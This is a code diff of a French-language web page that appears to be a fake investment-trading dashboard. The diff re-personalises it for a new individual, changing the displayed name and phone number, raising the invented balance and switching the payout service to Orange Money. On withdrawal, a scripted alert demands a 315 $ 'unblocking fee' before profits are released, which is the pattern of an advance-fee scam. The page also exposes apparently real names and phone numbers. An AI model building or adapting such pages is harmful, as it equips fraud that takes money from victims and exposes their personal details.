@@ -237,7 +237,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "2002") {
+        if (code === "8080") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -247,14 +247,14 @@
 
     <header>
         <div class="logo">
-            <h1> GLOBAL INVESTISSEMENT</h1>
+            <h1> GLOBAL TRADING INVESTISSEMENT</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1.000 $</span>
+                <span class="balance">Solde: 1 400 $</span>
                 <div class="account-info">
-                    <span id="user-name">MUGISHA ESPOIR</span><br>
-                    <span id="user-phone">243 97 56 18 025</span>
+                    <span id="user-name">MAVAKALA  CLEMENCE</span><br>
+                    <span id="user-phone">243 089 252 2528  </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -282,7 +282,7 @@
                 </div>
             </section>
             <section class="withdrawal-options">
-                <button id="orange-money">Retrait via Airtel Money</button>
+                <button id="orange-money">Retrait via Orange Money</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
@@ -314,17 +314,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = () => {
-                const paymentMethod = "Airtel Money";
-                const accountName = "MUGISHA ESPOIR";
-                const accountNumber = "243 97 56 18 025";
-                withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 1.000 $`;
+                const paymentMethod = "Orange Money";
+                const accountName = "MAVAKALA  CLEMENCE";
+                const accountNumber = "243 089 252 2528";
+                withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 1 400 $`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', setWithdrawalInfo);
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher MUGISHA veuillez payer la TVA qui es la derniere etape pour recevoir vos benefices dans les 5 minute');
+                alert('Cher MAVAKALA veuillez payer les frais de déblocages de 315 $ pour recevoir vos benefices dans les 5 minutes');
                 withdrawalForm.style.display = 'none';
             });
 
